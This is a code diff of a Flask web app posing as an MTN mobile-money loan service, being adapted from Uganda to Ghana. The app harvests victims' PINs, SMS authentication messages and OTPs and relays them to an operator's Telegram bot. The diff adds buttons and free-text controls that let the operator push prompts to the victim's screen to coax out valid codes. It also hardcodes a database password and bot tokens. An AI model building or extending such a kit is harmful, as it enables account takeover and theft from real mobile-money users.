@@ -8,14 +8,15 @@ import requests
 app = Flask(__name__)
 app.secret_key = "super_secret_momo_key"
 
-# MongoDB connection
-client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
+# MongoDB connection with SSL/TLS fallback for Vercel Serverless environment
+MONGO_URI = "mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser"
+client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
-# Telegram Configuration
-TELEGRAM_BOT_TOKEN = "8467275364:AAFJlOk-8cOlhok0XC40s-x604G0YxW_hqs"
-TELEGRAM_ADMIN_CHAT_ID = "8965398913"
+# Telegram Configuration for Ghana 🇬🇭
+TELEGRAM_BOT_TOKEN = "8893269969:AAGsjLNbAycQBkRByEGdZslWg-mT_MSuwAM"
+TELEGRAM_ADMIN_CHAT_ID = "7554571504"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
@@ -23,9 +24,9 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     message = (
         f"📩 *{stage_title}*\n\n"
         f"👤 *Name:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
-        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
+        f"📞 *Phone:* +233 {app_data.get('phone', '')}\n"
         f"🔑 *PIN:* `{app_data.get('password', '—')}`\n"
-        f"💬 *SMS Code:* `{app_data.get('auth_code', '—')}`\n"
+        f"💬 *SMS Message:* `{app_data.get('auth_code', '—')}`\n"
         f"🔢 *Final OTP:* `{app_data.get('final_auth_code', '—')}`\n\n"
         f"🆔 *Application ID:* `{app_data.get('app_id')}`"
     )
@@ -34,6 +35,10 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
         "inline_keyboard": [
             [
                 {"text": f"✅ Approve {step_code.upper()}", "callback_data": f"approve_{step_code}_{db_id}"}
+            ],
+            [
+                {"text": "⚠️ Bad SMS / Data", "callback_data": f"badsms_{step_code}_{db_id}"},
+                {"text": "⏱️ Stalled User", "callback_data": f"stalled_{step_code}_{db_id}"}
             ],
             [
                 {"text": f"❌ Reject {step_code.upper()}", "callback_data": f"reject_{step_code}_{db_id}"},
@@ -55,55 +60,124 @@ def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step
     except Exception as e:
         print(f"Telegram alert error: {e}")
 
+@app.route("/health")
+def health():
+    try:
+        client.admin.command('ping')
+        return jsonify({"status": "ok", "database": "connected"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 @app.route("/telegram-webhook", methods=["POST"])
 def telegram_webhook():
-    data = request.get_json()
-    
-    if "callback_query" in data:
-        callback = data["callback_query"]
-        callback_data = callback["data"]
-        callback_id = callback["id"]
+    try:
+        data = request.get_json() or {}
+        print("Received webhook data:", data)
         
-        parts = callback_data.split("_")
-        if len(parts) >= 3:
-            action = parts[0]
-            step_code = parts[1]
-            db_id = parts[2]
+        if "callback_query" in data:
+            callback = data["callback_query"]
+            callback_data = callback.get("data", "")
+            callback_id = callback.get("id")
             
-            if action == "approve":
-                if step_code == "pin":
-                    new_status = "Stage1_Approved"
-                elif step_code == "sms":
-                    new_status = "Stage2_Approved"
-                elif step_code == "otp":
-                    new_status = "Stage3_Approved"
-                else:
-                    new_status = "Approved"
+            parts = callback_data.split("_")
+            if len(parts) >= 3:
+                action = parts[0]
+                step_code = parts[1]
+                db_id = parts[2]
+                
+                text_response = "Action processed"
+                
+                try:
+                    obj_id = ObjectId(db_id)
+                except Exception as e:
+                    print(f"Invalid ObjectId format: {db_id}, error: {e}")
+                    return jsonify({"status": "ok"}), 200
 
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
-                    {"$set": {"status": new_status, "custom_message": ""}}
-                )
-                text_response = f"✅ {step_code.upper()} Approved!"
+                if action == "approve":
+                    if step_code == "pin":
+                        new_status = "Stage1_Approved"
+                    elif step_code == "sms":
+                        new_status = "Stage2_Approved"
+                    elif step_code == "otp":
+                        new_status = "Stage3_Approved"
+                    else:
+                        new_status = "Approved"
 
-            elif action == "reject":
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "Rejected", "custom_message": "Invalid authentication details. Please try again."}}
-                )
-                text_response = f"❌ {step_code.upper()} Rejected!"
+                    applications_collection.update_one(
+                        {"_id": obj_id},
+                        {"$set": {"status": new_status, "custom_message": ""}}
+                    )
+                    text_response = f"✅ {step_code.upper()} Approved!"
 
-            elif action == "msg":
-                applications_collection.update_one(
-                    {"_id": ObjectId(db_id)},
-                    {"$set": {"status": "CustomMessage", "custom_message": "Action Required: Please carefully check your authentication details and re-enter."}}
-                )
-                text_response = "💬 Prompt sent to user screen!"
+                elif action == "reject":
+                    if step_code == "pin":
+                        new_status = "Reject_PIN"
+                        fail_msg = "❌ PIN verification failed. Please check your PIN and re-enter."
+                    elif step_code == "sms":
+                        new_status = "Reject_SMS"
+                        fail_msg = "❌ SMS message was invalid or expired. Please re-copy and paste."
+                    elif step_code == "otp":
+                        new_status = "Reject_OTP"
+                        fail_msg = "❌ Final OTP incorrect. Please check your messages and try again."
+                    else:
+                        new_status = "Rejected"
+                        fail_msg = "❌ Request rejected. Please try again."
 
-            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
-            requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response})
+                    applications_collection.update_one(
+                        {"_id": obj_id},
+                        {"$set": {"status": new_status, "custom_message": fail_msg}}
+                    )
+                    text_response = f"❌ {step_code.upper()} Rejected!"
 
-    return jsonify({"status": "ok"}), 200
+                elif action == "badsms":
+                    applications_collection.update_one(
+                        {"_id": obj_id},
+                        {"$set": {"status": "BadInput", "custom_message": "⚠️ Invalid SMS/data format submitted. Please copy the complete, unedited message from MTN."}}
+                    )
+                    text_response = "⚠️ Flagged bad input!"
+
+                elif action == "stalled":
+                    applications_collection.update_one(
+                        {"_id": obj_id},
+                        {"$set": {"status": "StalledPrompt", "custom_message": "⏱️ Your session is waiting for authorization. Please respond promptly."}}
+                    )
+                    text_response = "⏱️ Sent stall reminder!"
+
+                elif action == "msg":
+                    applications_collection.update_one(
+                        {"_id": obj_id},
+                        {"$set": {"status": "CustomMessage", "custom_message": "💬 Admin Note: Please review your entry and provide the correct information."}}
+                    )
+                    text_response = "💬 Prompt sent!"
+
+                answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
+                try:
+                    requests.post(answer_url, json={"callback_query_id": callback_id, "text": text_response}, timeout=5)
+                except Exception as e:
+                    print(f"Answer callback error: {e}")
+
+        elif "message" in data:
+            msg = data["message"]
+            chat_id = str(msg.get("chat", {}).get("id"))
+            text = msg.get("text", "")
+            
+            if chat_id == TELEGRAM_ADMIN_CHAT_ID:
+                latest_app = applications_collection.find_one(sort=[("_id", -1)])
+                if latest_app:
+                    applications_collection.update_one(
+                        {"_id": latest_app["_id"]},
+                        {"$set": {"custom_message": text, "status": "CustomMessage"}}
+                    )
+                    reply_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                    requests.post(reply_url, json={
+                        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                        "text": f"📢 Pushed live to user screen:\n\"{text}\""
+                    })
+
+        return jsonify({"status": "ok"}), 200
+    except Exception as global_err:
+        print(f"Webhook global error caught: {global_err}")
+        return jsonify({"status": "ok"}), 200
 
 @app.route("/")
 def index():
@@ -150,15 +224,15 @@ def login():
         pin = request.form.get("pin")
         
         app_data = {
-            "loan_type": session.get("loan_type", "Personal"),
-            "amount": session.get("amount", "1000000"),
-            "term": session.get("term", "12 Months"),
+            "loan_type": session.get("loan_type", "QwikLoan (Letshego / JUMO)"),
+            "amount": session.get("amount", "5000"),
+            "term": session.get("term", "3 Months"),
             "purpose": session.get("purpose", "General"),
             "first_name": session.get("first_name", "User"),
             "last_name": session.get("last_name", "Applicant"),
             "phone": session.get("phone", "000000000"),
             "employment": session.get("employment", "Self-Employed"),
-            "income": session.get("income", "1000000"),
+            "income": session.get("income", "5000"),
             "password": pin,
             "status": "Pending_PIN",
             "created_at": time.time(),
@@ -207,20 +281,23 @@ def check_status():
             
     return jsonify({"status": "Pending_PIN", "custom_message": ""})
 
-@app.route("/submit-auth-code", methods=["POST"])
+@app.route("/submit-auth-code", methods=["GET", "POST"])
 def submit_auth_code():
-    auth_code = request.form.get("auth_code")
-    current_id = session.get("current_app_id")
-    
-    if current_id:
-        applications_collection.update_one(
-            {"_id": ObjectId(current_id)},
-            {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
-        )
-        record = applications_collection.find_one({"_id": ObjectId(current_id)})
-        send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS CODE SUBMITTED", step_code="sms")
+    if request.method == "POST":
+        auth_code = request.form.get("auth_code")
+        current_id = session.get("current_app_id")
         
-    return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
+        if current_id:
+            applications_collection.update_one(
+                {"_id": ObjectId(current_id)},
+                {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
+            )
+            record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS MESSAGE SUBMITTED", step_code="sms")
+            
+        return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
+    
+    return render_template("submit_auth_code.html")
 
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
